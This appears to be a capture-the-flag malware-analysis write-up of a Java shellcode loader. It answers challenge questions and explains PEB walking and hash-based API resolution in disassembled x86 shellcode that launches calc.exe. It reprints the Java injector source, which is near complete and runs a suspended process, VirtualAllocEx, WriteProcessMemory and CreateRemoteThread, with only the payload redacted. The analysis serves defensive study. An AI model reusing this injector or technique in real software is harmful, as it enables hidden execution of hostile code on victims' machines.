# Java Shellcode

## Challenge Description 

<img width="1159" height="398" alt="image" src="https://github.com/user-attachments/assets/45a59361-45e4-4d1b-80d7-c8191f4f9487" />

## Solution and Analysis 

First extract the .jar file from the password protected archive and open it up in the java decompiler located in the tools section of the VM

<img width="1017" height="725" alt="image" src="https://github.com/user-attachments/assets/ae1e2d70-768e-4b83-affc-d42ac3f1978f" />

#### What library is used to load native libraries into the code?
**Answer:** **JNA (Java Native Access)**. This is evident from the `import com.sun.jna.*` statements. JNA provides Java programs with easy access to native shared libraries (like DLLs on Windows).

#### What system property is used to determine whether to target 32-bit or 64-bit processes?
**Answer:** **`sun.arch.data.model`**. The code checks this property with `System.getProperty("sun.arch.data.model").equals("64")` to determine if the Java Virtual Machine is running in 64-bit mode.

#### How many x64 processes were targeted by the shellcode?
**Answer:** **Four (4)**. The `ProcessArrayx64` array contains four potential target executables: `rundll32.exe`, `find.exe`, `notepad.exe`, and `ARP.EXE`.

#### Which API function loaded kernel32.dll?
**Answer:** The JNA function **`Native.loadLibrary("kernel32", ...)`**. This function dynamically loads the `kernel32.dll` library into the Java process's address space, allowing the program to call its functions.

#### What is the length of the shellcode?
**Answer:** **386**. The hexadecimal string provided for analysis contains 386 characters. Since two hex characters represent one byte, the total length is 386 / 2 = 193 bytes.

#### What is the API used to allocate a region of memory in the target process?
**Answer:** **`VirtualAllocEx`**. This Windows API function is used to reserve a region of memory within the virtual address space of a specified external process.

#### What API was used to write shellcode?
**Answer:** **`WriteProcessMemory`**. This API is used to write data (the shellcode) into the memory region that was previously allocated in the target process.

#### What API was used to execute the shellcode in the target process?
**Answer:** **`CreateRemoteThread`**. This API creates a new thread that begins execution in the address space of another process. The malware sets the starting address of this new thread to the location of the injected shellcode.

---

## Comprehensive Analysis

### The Java Loader (`ShellcodeLoader.java`)

The Java code acts as a **dropper** and **injector**. Its sole purpose is to take the embedded shellcode payload, inject it into a legitimate Windows process, and trigger its execution.

**Step-by-Step Operation:**

1.  **Initialization**: The program uses JNA to load the Windows `kernel32.dll` library, giving it access to low-level operating system functions.
2.  **Target Selection**: It defines lists of common 32-bit and 64-bit Windows executables. It checks its own architecture and then **randomly selects one legitimate process** from the appropriate list to serve as a host.
3.  **Process Creation**: It uses `CreateProcess` to launch the chosen target (e.g., `notepad.exe`) but creates it in a **suspended state** (`CREATE_SUSPENDED`, flag value `4`). The process is loaded into memory but its main thread has not yet started, giving the malware a window to manipulate it.
4.  **Memory Allocation**: It calls `VirtualAllocEx` to allocate a new block of memory *inside the target process*, marking it as executable.
5.  **Payload Injection**: It converts the hardcoded hex string into raw bytes and uses `WriteProcessMemory` to copy the shellcode into the newly allocated memory space.
6.  **Execution**: It calls `CreateRemoteThread`, instructing the target process to start a new thread beginning at the address of the injected shellcode.

### The x86 Shellcode (Assembly Analysis)

The disassembled shellcode is a sophisticated, position-independent payload designed to dynamically find and call Windows API functions.

#### Phase 1: Setup and Finding `kernel32.dll`

The shellcode's first task is to find the base address of `kernel32.dll`.

```asm
; Get the shellcode's own base address for position-independent calculations
00000001 E882000000        CALL 00000088
...
00000088 5D                POP EBP         ; EBP now holds the base address

; Find kernel32.dll by walking the PEB
0000000B 648B5030          MOV EDX,DWORD PTR FS:[EAX+30] ; Get PEB
0000000F 8B520C            MOV EDX,DWORD PTR [EDX+0C]  ; Get PEB_LDR_DATA
00000012 8B5214            MOV EDX,DWORD PTR [EDX+14]  ; Get first entry in InLoadOrderModuleList
```
- **Position Independence**: The `CALL`/`POP` trick allows the shellcode to find its own location in memory, which is essential for calculating offsets to data stored within it.
- **PEB Walking**: The code navigates the Process Environment Block (PEB) to find the list of loaded DLLs. It then enters a loop, hashing the name of each DLL with a `ROR 13` algorithm until it finds the one matching the pre-calculated hash for `kernel32.dll`.

#### Phase 2: Dynamic API Resolution

With the base address of `kernel32.dll`, it now finds the addresses of the functions it needs: `WinExec` and `LoadLibraryA`.

```asm
; Parse the PE header of kernel32.dll to find the Export Address Table (EAT)
00000031   8B4A3C            MOV ECX,DWORD PTR [EDX+3C]      ; Offset to PE header
00000034   8B4C1178          MOV ECX,DWORD PTR [ECX+EDX+78]  ; Offset to EAT

; Loop through function names, hash them, and compare with target hashes
...
00000092   68318B6F87        PUSH 876F8B31     ; Hash for WinExec
00000097   FFD5              CALL EBP          ; Call the resolver
...
0000009E   68A695BD9D        PUSH 9DBD95A6     ; Hash for LoadLibraryA
000000A3   FFD5              CALL EBP          ; Call the resolver again
```
- The code parses the `kernel32.dll` PE header to locate its **Export Address Table (EAT)**.
- It loops through all function names, calculates their hash, and compares them to the target hashes to find the exact memory addresses of `WinExec` and `LoadLibraryA`.

#### Phase 3: Payload Execution

Finally, the shellcode executes its main goal.

```asm
; Prepare arguments for WinExec
0000008B   8D85B2000000      LEA EAX,[EBP+000000B2]  ; Load address of "calc.exe" string
00000091   50                PUSH EAX                ; Push string pointer onto stack
00000089   6A01              PUSH 00000001           ; Push 1 (SW_SHOWNORMAL)

; Call WinExec
00000097   FFD5              CALL EBP                ; EBP holds the resolved function address
```
- The arguments for `WinExec` (a pointer to the string "calc.exe" and a window state flag) are pushed onto the stack.
- The previously resolved address of `WinExec` is called, launching the Windows Calculator.

**Note on Disassembly Artifacts:** The end of the disassembly shows garbled instructions like `ARPL`. This is the disassembler incorrectly trying to interpret the raw bytes of the `"calc.exe"` string as executable code. The actual shellcode logic finishes before this data segment.

---

## How This Code is Malicious

While this specific sample only launches the harmless Windows Calculator, the underlying framework is malicious for several critical reasons:

1.  **Evasion and Stealth**: The primary malicious characteristic is **process injection**. By running its code inside a trusted process like `notepad.exe`, it evades security software. Firewalls or antivirus programs are less likely to block activity originating from a legitimate process, allowing the malicious code to operate undetected.
2.  **Arbitrary Code Execution**: The `calc.exe` payload is a proof-of-concept. An attacker could replace the shellcode string with any payload, such as ransomware, a keylogger, a Remote Access Trojan (RAT), or a downloader to fetch more advanced malware.
3.  **Obfuscation**: The use of hash-based API resolving is a form of obfuscation. It prevents static analysis tools from easily identifying which dangerous functions the malware intends to call, as these names do not appear as plain text strings in the binary.

## Defanged Java code 

```java
package asexploits;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import java.io.IOException;
import java.util.Random;

public class ShellcodeLoader {
  static Kernel32 kernel32;
  static IKernel32 iKernel32;

  public static String[] ProcessArrayx32 = new String[] {
      "C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe", "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com", "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe",
      "C:\\Windows\\SysWOW64\\choice.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe", "C:\\Windows\\SysWOW64\\comp.exe", "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe", "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe", "C:\\Windows\\SysWOW64\\gpresult.exe" };

  public static String[] ProcessArrayx64 = new String[] { "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe", "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\ARP.EXE" };

  static {
    kernel32 = (Kernel32)Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
    iKernel32 = (IKernel32)Native.loadLibrary("kernel32", IKernel32.class);
  }

  public static void main(String[] args) throws IOException {
    ShellcodeLoader jnaLoader = new ShellcodeLoader();
    String shellcode = null;
    boolean is64 = false;
    
    // --- PAYLOAD HAS BEEN DEFANGED ---
    // The original string contained 193 bytes of x86 shellcode to launch calc.exe
    shellcode = "[SHELLCODE_REDACTED_FOR_SAFETY]";
    
    System.out.println("\nShellcode Payload: " + shellcode);
    jnaLoader.loadShellCode(shellcode, is64);
  }

  public void loadShellCode(String shellcodeHex, boolean is64) {
    // Do not run if the shellcode is redacted
    if (shellcodeHex.contains("REDACTED")) {
        System.out.println("Execution halted: Shellcode has been defanged.");
        return;
    }

    String[] targetProcessArray = null;
    if (System.getProperty("sun.arch.data.model").equals("64") && is64) {
      targetProcessArray = ProcessArrayx64;
    } else {
      targetProcessArray = ProcessArrayx32;
    }
    int j = targetProcessArray.length;
    Random random = new Random();
    int k = random.nextInt(j);
    String targetProcess = targetProcessArray[k];
    loadShellCode(shellcodeHex, targetProcess);
  }

  public void loadShellCode(String shellcodeHex, String targetProcess) {
    System.out.println("Targeting process: " + targetProcess);
    byte[] shellcode = hexStrToByteArray(shellcodeHex);
    int shellcodeSize = shellcode.length;
    IntByReference intByReference = new IntByReference(0);
    Memory memory = new Memory(shellcodeSize);
    for (int j = 0; j < shellcodeSize; j++)
      memory.setByte(j, shellcode[j]);

    WinBase.PROCESS_INFORMATION pROCESS_INFORMATION = new WinBase.PROCESS_INFORMATION();
    WinBase.STARTUPINFO sTARTUPINFO = new WinBase.STARTUPINFO();
    sTARTUPINFO.cb = new WinDef.DWORD(pROCESS_INFORMATION.size());

    // Create the target process in a suspended state
    if (kernel32.CreateProcess(targetProcess, null, null, null, false, new WinDef.DWORD(4L), null, null, sTARTUPINFO, pROCESS_INFORMATION)) {
      // Allocate memory in the remote process
      Pointer pointer = iKernel32.VirtualAllocEx(pROCESS_INFORMATION.hProcess, Pointer.createConstant(0), shellcodeSize, 4096, 64);
      
      // Write the shellcode to the allocated memory
      iKernel32.WriteProcessMemory(pROCESS_INFORMATION.hProcess, pointer, (Pointer)memory, shellcodeSize, intByReference);
      
      // Create a remote thread to execute the shellcode
      WinNT.HANDLE hANDLE = iKernel32.CreateRemoteThread(pROCESS_INFORMATION.hProcess, null, 0, pointer, 0, 0, null);
      
      // Wait for the shellcode to finish
      kernel32.WaitForSingleObject(hANDLE, -1);
    }
  }

  public static byte[] hexStrToByteArray(String str) {
    if (str == null)
      return null;
    if (str.length() == 0)
      return new byte[0];
    byte[] byteArray = new byte[str.length() / 2];
    for (int i = 0; i < byteArray.length; i++) {
      String subStr = str.substring(2 * i, 2 * i + 2);
      byteArray[i] = (byte)Integer.parseInt(subStr, 16);
    }
    return byteArray;
  }

  static interface IKernel32 extends StdCallLibrary {
    Pointer VirtualAllocEx(WinNT.HANDLE param1HANDLE, Pointer param1Pointer, int param1Int1, int param1Int2, int param1Int3);
    WinNT.HANDLE CreateRemoteThread(WinNT.HANDLE param1HANDLE, Object param1Object1, int param1Int1, Pointer param1Pointer, int param1Int2, int param1Int3, Object param1Object2);
    boolean WriteProcessMemory(WinNT.HANDLE param1HANDLE, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int, IntByReference param1IntByReference);
    // Other function definitions...
  }
}
```

## Conclusion

In conclusion, the analyzed sample is a classic malicious loader that provides a stealthy and reliable mechanism for executing arbitrary, hostile code on a victim's machine by hijacking a legitimate Windows process. The techniques used are designed to bypass security controls and hide the true nature of the payload.
